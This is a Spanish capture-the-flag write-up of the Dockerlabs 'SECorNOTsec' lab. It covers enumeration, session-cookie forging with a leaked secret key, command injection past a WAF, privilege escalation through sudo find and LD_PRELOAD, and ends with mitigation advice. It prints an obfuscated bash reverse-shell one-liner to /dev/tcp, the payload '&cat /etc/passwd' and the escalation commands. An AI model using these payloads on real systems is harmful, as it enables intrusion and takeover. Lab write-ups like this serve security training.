# SECorNOTsec - Dockerlabs

**Nivel:** Medio

## Introducción

Este laboratorio presenta una cadena de vulnerabilidades críticas que demuestran la importancia de la seguridad en capas. A través de una serie de ataques progresivos, el objetivo es obtener acceso de administrador y, posteriormente, acceso root al sistema.

---

## Fase 1: Enumeración Inicial

### Escaneo Nmap

El laboratorio comienza con un escaneo de nmap que revela únicamente el puerto 5000 abierto:

![alt text](img/1-nmap.png)

### Enumeración Web y Gobuster

Dada la limitada información inicial, se ejecuta un escaneo de gobuster mientras simultáneamente se visita el puerto en el navegador. Se muestra un panel de control, pero está restringido ya que no poseemos permisos de administrador:

![alt text](img/3-http.png)

---

## Fase 2: Análisis de Seguridad y Exposición de Secretos

### Exposición del Vector de Inicialización (IV)

En el código fuente de la aplicación web se puede observar una advertencia referente al IV (Vector de Inicialización), el cual es **estático**. El comentario del código recomienda usar uno dinámico:

![alt text](img/4-httpCCode.png)

### Descubrimiento de env.bak

El escaneo de gobuster finaliza revelando un archivo de respaldo llamado `env.bak`, que contiene la clave secreta de la aplicación:

![alt text](img/2-gobuster.png)
![alt text](img/5-EnvBak.png)

---

## Fase 3: Forja de Cookies de Sesión (Cookie Forging)

### Extracción y Decodificación de la Cookie Actual

Con la clave secreta en nuestro poder, se abre un vector de ataque evidente: **falsificar la cookie de sesión del usuario** utilizando la clave secreta descubierta. Para ello, se procede a descodificar la cookie de sesión actual:

![alt text](img/6-Coockie.png)

**Nota técnica:** Para obtener la cookie, se accede al inspector de la página (F12), luego a la sección Storage > Cookies de sesión.

### Creación de Cookie de Administrador

Una vez decodificada y confirmado que la clave secreta es funcional, se descubre que existe un parámetro crítico: `"is-admin"`. Se crea una nueva cookie de sesión validando este parámetro como `true` mediante un script de Python:

![alt text](img/7-CockieAdmin.png)

---

## Fase 4: Inyección de Comandos y Bypass WAF

### Exposición de la Consola de Diagnóstico

Una vez obtenidos los permisos de administrador, la página principal del sitio web se expone completamente, revelando una herramienta de "verificación de conectividad". Al ejecutarse, internamente ejecuta el comando `ping` con la IP proporcionada, lo que indica que **el programa está ejecutando comandos del sistema operativo directamente desde una consola**:

![alt text](img/8-ConsolDiagnostico.png)

### Identificación del WAF y Bypass

El sistema implementa un WAF (Web Application Firewall) que bloquea caracteres típicos de ejecución de código como `";"` o `"|"`. Sin embargo, tras varias pruebas, se descubre que el operador `"&"` **es funcional**. Se prueba lanzando el comando `&cat /etc/passwd`, obteniendo éxito:

![alt text](img/10-InyectionCommand.png)

### Ofuscación y Reverse Shell

Como la palabra `"bash"` está completamente bloqueada, se utiliza un método simple de ofuscación: `"b''ash"`. El comando final construido es:

```bash
b''ash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Este comando se inserta en un archivo, se le otorgan permisos de ejecución con `&chmod +x file.sh`, y luego se ejecuta mediante bash.



---

## Fase 5: Primera Escalada de Privilegios

### Acceso Inicial como Usuario 'firstatack'

Una vez ejecutada la reverse shell, se obtiene acceso al sistema como el usuario `firstatack`. El primer paso es verificar los permisos de sudo disponibles:

```bash
sudo -l
```

![alt text](img/11-Chocolate.png)

Los resultados muestran que el usuario `firstatack` puede ejecutar el comando `find` **sin contraseña** como el usuario `chocolate`.

### Explotación de find - Escalada a Usuario 'chocolate'

El comando `find` posee la capacidad de ejecutar otros comandos mediante la opción `-exec`. Se aprovecha esta característica para ejecutar una bash interactiva como el usuario `chocolate`:

```bash
sudo -u chocolate find . -exec /bin/bash \; -quit
```

![alt text](img/12-ChocolateUserBash.png)

### Verificación de Permisos del Usuario 'chocolate'

Se verifica nuevamente los permisos sudo del nuevo usuario:

![alt text](img/13-sudo-LChocolate.png)

---

## Fase 6: Escalada Final a Root - Explotación LD_PRELOAD

### Vulnerabilidad LD_PRELOAD con SETENV Permitido

El nuevo binario disponible permite la explotación de la vulnerabilidad **LD_PRELOAD** porque el flag `SETENV` está permitido en la configuración de sudo. 

Esta vulnerabilidad funciona de la siguiente manera:
1. Se crea una librería compartida maliciosa que contiene código para ejecutar una bash con permisos elevados
2. Se compila la librería
3. Se utiliza la variable de entorno `LD_PRELOAD` para forzar la carga de esta librería antes que las librerías del sistema
4. Al ejecutar el binario protegido, se carga la librería maliciosa manteniendo los permisos del propietario (root)

### Ejecución y Obtención de Acceso Root

Se elabora la librería maliciosa y se compila. Luego se ejecuta junto al binario protegido sin requerir contraseña:

![alt text](img/14-root.png)

**Resultado:** Se obtiene acceso a una consola con permisos **root**. ¡Se ha completado la escalada total del sistema!

---

## Recomendaciones de Mitigación de Vulnerabilidades

### 1. **Gestión Segura de Secretos**
**Vulnerabilidad:** Exposición de archivos de respaldo (`env.bak`) con claves secretas.

**Recomendación:**
- Nunca almacenar archivos de respaldo `.bak`, `.backup` o similares en directorios accesibles web
- Implementar un sistema centralizado de gestión de secretos (ej: HashiCorp Vault, AWS Secrets Manager)
- Mantener secretos únicamente en variables de entorno no accesibles públicamente
- Implementar auditoría y control de acceso para archivos sensibles
- Usar `.gitignore` para evitar commits accidentales de archivos con secretos

### 2. **Validación Criptográfica Robusta**
**Vulnerabilidad:** IV (Vector de Inicialización) estático en código fuente.

**Recomendación:**
- Utilizar IVs dinámicos generados aleatoriamente para cada sesión de cifrado
- Implementar HMAC (Hash-based Message Authentication Code) para verificar integridad de cookies
- Usar bibliotecas de serialización de sesión comprobadas (ej: JWT con algoritmos seguros)
- Nunca confiar en valores estáticos para operaciones criptográficas
- Realizar auditorías regulares del código para identificar valores hardcodeados

### 3. **Validación de Entrada y Prevención de Inyección de Comandos**
**Vulnerabilidad:** Inyección de comandos a través del operador `&`.

**Recomendación:**
- Utilizar una lista blanca estricta de caracteres permitidos
- Implementar sanitización robusta en el lado del servidor
- Evitar `os.system()` o funciones equivalentes; usar alternativas seguras como `subprocess.run()` en Python con `shell=False`
- Implementar WAF con reglas más exhaustivas que bloqueen combinaciones de caracteres peligrosas
- Ejecutar procesos con permisos mínimos necesarios
- Validar y parsear entrada manualmente en lugar de confiar solo en WAF

### 4. **Protección de Palabras Clave Críticas**
**Vulnerabilidad:** Bypass de filtrado mediante ofuscación simple (`b''ash`).

**Recomendación:**
- Implementar filtrado basado en comportamiento, no en palabras clave
- Usar análisis léxico para detectar intentos de ofuscación
- Ejecutar en contenedores o espacios aislados (sandboxing)
- Limitar las llamadas al sistema que pueden ser realizadas por usuarios no autorizados
- Implementar detección de anomalías basada en patrones de uso

### 5. **Control de Acceso basado en Principios de Menor Privilegio**
**Vulnerabilidad:** Permisos sudo excesivos (usuario `firstatack` puede usar `find` como `chocolate`).

**Recomendación:**
- Aplicar estrictamente el principio del menor privilegio (Principle of Least Privilege)
- Auditar regularmente todas las configuraciones de sudo (`visudo`)
- Reemplazar `find` con alternativas más restrictivas cuando sea posible
- Deshabilitar la ejecución de comandos internos peligrosos (`-exec`, `-delete`, etc.)
- Mantener un registro de cambios en configuraciones de permisos
- Usar herramientas como `sudo-audit` para monitorear ejecuciones

### 6. **Mitigación de Vulnerabilidades LD_PRELOAD**
**Vulnerabilidad:** Explotación de LD_PRELOAD con `SETENV` permitido.

**Recomendación:**
- **Nunca permitir `SETENV` en binarios que se ejecutan con privilegios elevados sin justificación crítica**
- Usar `secure_path` en sudoers para controlar la ruta de búsqueda de librerías
- Implementar `LD_LIBRARY_PATH` restrictivo o deshabilitado mediante compilación
- Usar AppArmor o SELinux para restringir el acceso a librerías compartidas
- Firmar binarios criptográficamente y verificar la firma antes de ejecución
- Ejecutar procesos críticos en modo apparmor confinement
- Mantener monitoreo continuo de cambios en directorios de librerías críticas

---

**Conclusión:** Este laboratorio demuestra la importancia de una defensa en profundidad. Ninguna vulnerabilidad individual habría permitido el compromiso total, pero la combinación de varias debilidades resultó en acceso root completo. La mitigación efectiva requiere atención a múltiples capas de seguridad.
